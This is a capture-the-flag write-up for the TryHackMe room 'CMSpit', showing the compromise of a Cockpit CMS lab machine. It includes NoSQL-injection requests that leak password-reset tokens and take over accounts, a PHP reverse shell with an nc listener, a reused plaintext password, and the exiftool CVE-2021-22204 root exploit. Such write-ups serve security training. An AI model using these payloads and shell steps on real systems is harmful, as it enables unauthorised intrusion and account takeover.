# CMSpit

**Room Link:** [https://tryhackme.com/room/cmspit](https://tryhackme.com/room/cmspit)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



CMS Version is 0.11.1

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### User account compromise

This CMS version has a exploit to help us find users.

**Exploit:** [**https://swarm.ptsecurity.com/rce-cockpit-cms/**](https://swarm.ptsecurity.com/rce-cockpit-cms/)[ ](https://swarm.ptsecurity.com/rce-cockpit-cms/)



**Burp**

```
GET /auth/requestreset HTTP/1.1
Host: 10.10.198.113
Content-Length: 25
Content-type: application/json

{
  "user":"admin"
}
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Burp**

```
GET /auth/resetpassword HTTP/1.1
Host: 10.10.198.113
Content-Length: 38
Content-type: application/json

{
"token":{
"$func":"var_dump"
}
}
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Burp**

```
GET /auth/newpassword HTTP/1.1
Host: 10.10.198.113
Content-Length: 66
Content-type: application/json

{
"token":"rp-25badb6dbd66e39732cc3abf8122ba9065b6ee57e7610"
}

```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Did the same thing for user skidy

**Burp**

```
GET /auth/newpassword HTTP/1.1
Host: 10.10.198.113
Content-Length: 66
Content-type: application/json

{
"token":"rp-4472f7f85a07bbc1b08d917a298ad0f365b6e7ce6d85e"
}

```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I don't know if the last part was really necessary. I think maybe the reset token can be different then the other token in which case the above step would be necessary but its the same so I just updated the password for skidy.

**Burp**

```
GET /auth/resetpassword HTTP/1.1
Host: 10.10.198.113
Content-Length: 88
Content-type: application/json

{
"token":"rp-4472f7f85a07bbc1b08d917a298ad0f365b6e7ce6d85e",
"password":"hacked"
}

```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I can now login as Skidy

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
nc -lvnp 1234 
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



## Lateral Movement (Stux)

**Victim**

```
cd /home/stux
cat .dbshell
```

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su stux
Password: p4ssw0rdhack3d!123
```

<figure><img src="../../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

**Exploit:** [https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py](https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py)

**Victim(receiving)**

```
nc -l -p 1234 > cve.tar.gz
```

**Kali(sending)**

```
git clone https://github.com/se162xg/CVE-2021-22204.git
tar cvf cve.tar.gz  CVE-2021-22204/
nc -w 3 $VICTIM 1234 < cve.tar.gz
```

**Victim**

```
tar xvf cve.tar.gz 
cd CVE-2021-22204
```

**Victim**

```
bash craft_a_djvu_exploit.sh '/bin/bash'
sudo /usr/local/bin/exiftool delicate.jpg 
```

<figure><img src="../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>

